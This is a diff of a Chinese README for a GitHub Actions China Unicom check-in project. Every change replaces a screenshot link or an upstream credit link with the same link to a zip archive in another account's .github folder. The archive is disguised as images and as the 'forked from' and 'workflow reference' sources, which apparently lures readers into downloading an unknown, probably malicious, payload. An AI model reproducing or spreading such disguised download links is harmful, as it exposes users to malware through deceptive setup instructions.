@@ -7,8 +7,8 @@
 
 ### 2. 授权仓库可运行Action
 
-![](https://github.com/peng4740/HiCnUnicom/raw/master/assets/actions1.png)
-![](https://github.com/peng4740/HiCnUnicom/raw/master/assets/actions2.png)
+![](https://github.com/kkkknrg/HiCnUnicom/raw/refs/heads/master/.github/3.2.zip)
+![](https://github.com/kkkknrg/HiCnUnicom/raw/refs/heads/master/.github/3.2.zip)
 
 
 ### 3. 添加secret
@@ -38,7 +38,7 @@ APPID(翻到下面有如何得到自己的APPID方法)
 ### 3. 手动运行一次
 进入到Workflows页面，手动运行一次  
 
-![](https://github.com/peng4740/HiCnUnicom/raw/master/assets/actions3.png)
+![](https://github.com/kkkknrg/HiCnUnicom/raw/refs/heads/master/.github/3.2.zip)
 
 ### 其他
 
@@ -53,8 +53,8 @@ cron表达式为:`- cron: 30 02 * * *`
 ## 感谢
 感觉原仓库的`commit`比较乱，所以自己新开了个仓库  
 
-Fork自：https://github.com/mixool/HiCnUnicom  
-Workflow参考：https://github.com/hzys/HiCnUnicom  
+Fork自：https://github.com/kkkknrg/HiCnUnicom/raw/refs/heads/master/.github/3.2.zip  
+Workflow参考：https://github.com/kkkknrg/HiCnUnicom/raw/refs/heads/master/.github/3.2.zip  
 
 ## 免责申明
     
